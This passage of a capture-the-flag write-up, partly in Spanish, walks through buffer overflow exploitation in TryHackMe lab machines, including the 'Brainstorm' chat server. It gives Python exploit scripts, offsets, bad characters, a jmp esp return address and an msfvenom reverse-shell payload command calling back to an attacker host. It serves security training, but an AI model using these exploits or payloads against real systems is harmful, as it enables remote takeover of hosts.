<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>Al enviarlo observamos en el Immunity Debugger que el EIP ha quedado sobreescrito con el término: 71423471. De esta forma, con el comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 1500 <span class="nt">-q</span> 3571234
</code></pre></div></div>

<p>Obtenemos que el offset concreto es 1274, para comprobarlo empleamos el siguiente script y observamos si el EIP ha quedado sobreescrito con el término ‘42424242’:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.37.115"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW3 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<ul>
  <li><em>Finding Bad Characters</em>: Ahora, generamos un string de bytes hexadecimales mediante el siguiente script:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

<p>Incluyéndolo en el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 badchars.py | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\\n'</span> <span class="p">;</span> echo.
</code></pre></div></div>

<p>De esta forma, el output de el comando anterior se copia en la variable postfix del exploit.py de forma que se introduzca después de la sobreescritura del EIP (como nuestra shellcode, puesto que lo que queremos hacer con este paso es ver cómo se procesa el código de nuestra shellcode).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.29.130"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW3 "</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">1274</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span>
</code></pre></div></div>

<p>De forma que repasamos el hexdump a partir del registro ESP y obtenemos que los badchars son: \x00\x11\x40\x5F\xB8\xEE.</p>

<p>De esta forma, con los badchars ya podríamos construir satisfactoriamente una shellcode y encontrar un puntero de salto al ESP (jmp esp) adecuado para crear un exploit que nos de acceso a la máquina.</p>

<p><br /></p>

<p><strong>OVERFLOW4</strong></p>

<ul>
  <li><em>Fuzzing</em>: Fuzzeamos y nos informa de que el servicio crashea a los 2100 a través del comando OVERFLOW4.</li>
  <li><em>Catching Offset</em>: Empleamos las herramientas de metasploit para crear un patrón de 2200 bytes y medimos el offset exacto desde el inicio con el término que queda sobreescrito el registro EIP. El EIP ha quedado sobreescrito con el término 70433570, que coincide con el offset: 2026.</li>
  <li><em>BadCharacters</em>: Modificamos el exploit.py y Generamos un string de bytes en hexadecimal para enviarlo en el exploit después de la sobreescritura del EIP para buscar badchars. Obtenemos que estos son: \x00\xA9\xCD\xD4</li>
</ul>

<p><br /></p>

<p><strong>OVERFLOW5</strong></p>

<ul>
  <li><em>Fuzzing</em>: 400 bytes.</li>
  <li><em>Offset</em>: 314</li>
  <li><em>Badchars</em>: \x00\x16\x2F\xF4\xFD</li>
</ul>

<p><br /></p>

<p><strong>OVERFLOW6</strong></p>

<ul>
  <li><em>Fuzzing</em>: 1100</li>
  <li><em>Offset</em>: 1034</li>
  <li><em>BadChars</em>: \x00\x08\x2C\xAD</li>
</ul>

<p><br /></p>

<p><strong>OVERFLOW7</strong></p>

<ul>
  <li><em>Fuzzing</em>: 1400</li>
  <li><em>Offset</em>: 1306</li>
  <li><em>BadChars</em>: \x00\x8C\xAE\xBE \xFB</li>
</ul>

<p><strong>OVERFLOW8</strong></p>

<ul>
  <li><em>Fuzzing</em>:1800</li>
  <li><em>Offset</em>: 1786</li>
  <li><em>BadChars</em>:\x00\x1D\x2E\xC7\xEE</li>
</ul>

<p><strong>OVERFLOW9</strong></p>

<ul>
  <li><em>Fuzzing</em>: 1600</li>
  <li><em>Offset</em>: 1514</li>
  <li><em>BadChars</em>: \x00\x04\x3E\x3F\xE1</li>
</ul>

<p><strong>OVERFLOW10</strong></p>

<ul>
  <li><em>Fuzzing</em>:</li>
  <li><em>Offset</em>:</li>
  <li><em>BadChars</em>:</li>
</ul>

<p><br /></p>

<h4 id="72-brainstorm">7.2. Brainstorm.</h4>

<p>In this case we have a Windows Machine in which we are going to perfom a BufferOverFlow attack through a service. In first place we are going to prepare the attack <em>offline</em> downloading the executable that runs the service and then we are going to proceed online.</p>

<p><br /></p>

<p><strong>Port Scanning</strong></p>

<p>In first place, we do a port scanning of the machine. The results shown that we have open at least 3 ports, 21 (ftp service), 3389 (RDP service, thus is a Windows machine), 9999 (with unknown service).</p>

<p>In subsequent scans (-A flag) we find that the anonymous user is allowed in the ftp service and that the service offered by the 9999 port is indeed a serverchat.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221031184427.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221031184450.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>FTP Service Enumeration</strong></p>

<p>Then, we proceed to use the FTP client to connect to the ftp server and explore it.</p>

<p>We log as anonymous user and deactive the <em>passive</em> mode and activate <em>ascii</em> mode to be able to receive the output of the comands that we send:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221031185441.png" text-align="center" />
</div>

<p>We found the <em>chatserver.exe</em> which is presumibly, the executable that initiate the service. Then, we proceed to download it in order to prepare a bufferoverflow attack.</p>

<p>For this, we activate the <em>binary</em> mode and ‘get’ the file from the ftp server:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221031185637.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Preparing Buffer Overflow attack</strong></p>

<p>Then, we have to transfer the executable file to an Windows VM that already have <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a> and <a href="https://github.com/corelan/mona">Mona</a> installed.</p>

<p>Once there, we use the following python code to <em>fuzz</em> the service:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.0.2.4"</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">string</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> <span class="c1">#La b indica que se envía en forma de bytes, de otra forma no se podrá realizar el envío y se desencadenará un error. Además, \r\n hace que lo siguiente se envíe en una nueva línea.
</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="s">"latin-1"</span><span class="p">))</span> <span class="c1">#De nuevo volvemos a enviar el string de desbordamiento en bytes.
</span><span class="k">print</span><span class="p">(</span><span class="s">"[+] Sended %s bytes"</span><span class="o">%</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Service crashed at %s bytes"</span><span class="o">%</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We have to note that, as the name can only contain 20 caracters it is only reasonable to test the ‘message’ command.</p>

<p>When use this code, the fuzz will start until the 2100 bytes:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221101180355.png" text-align="center" />
</div>

<p>Then, we take a look over the Immunity Debugger and we verify that the service crashed because a overwriting of the EIP registry and thus, the service is vulnerable to a BufferOverflow attack through the message command:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221101180710.png" text-align="center" />
</div>

<p>Then, we proceed to calculate exact offset. For this purpose we use the following code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'10.0.2.4'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span><span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[!] Cannot connect to the service."</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>With the code above, we generate a 2100 pattern with the comand below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 2100
</code></pre></div></div>

<p>And we include the output in the payload variable and execute the exploit.py. Thus, we can see in Immunity Debugger that the EIP registry has the term: 31704330, with the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 2100 <span class="nt">-q</span> 31704330
</code></pre></div></div>

<p>We found that the exact offset is 2012.</p>

<p>We can verify this by deleting the payload variable value on the exploit.py code and setting the ‘offset’ variable to 2012 and the ‘retn’ variable to “B”*4. Then, we send again the exploit.py and if the EIP get overwrited with “42424242” (four ‘B’s in hex), then we done calculating the offset.</p>

<p>Now is time to found the badcaracters. For that, we want to send an string of hex chars next to the EIP overwritting to see how the shellcode is going to be treated by the program so we remain the offset and the retn values on the exploit.py code.</p>

<p>We employ the following python code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

<p>On the next command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 badchars.py | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span><span class="nb">echo</span>
</code></pre></div></div>

<p>To receive a string of hex chars that we include in exploit.py on the payload variable.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">2012</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'10.0.2.4'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span><span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[!] Cannot connect to the service."</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>We send this code, and before the service crash, in Immunity Debugger we exam the hexdump of the ESP registry and take note over the bad chars. It appears that, except \x00, the binary doesn’t have any badchars.</p>

<p>Only remains to find a ‘jmp esp’ pointer that it can be achieve with the following mona command: <em>!mona jmp -r esp -cpb “\x00”</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221101191013.png" text-align="center" />
</div>

<p>Then, we select the first one ‘625014df’ and we include it in the ‘retn’ variable as hex chars on the reverse way:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">2012</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xdf\x14\x50\x62</span><span class="s">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">16</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
<span class="k">try</span><span class="p">:</span>
<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'10.0.2.4'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span><span class="s">"latin-1"</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[!] Cannot connect to the service."</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>Note that the padding variable only contains trash to separate the buffer overflow from the shellcode to guarantee a correct behaviour of the malware.</p>

<p>Last, with msfvenom we create a shellcode:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.15 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
</code></pre></div></div>

<p>And we include the output on the payload variable:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">2012</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xdf\x14\x50\x62</span><span class="s">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span><span class="mi">16</span>
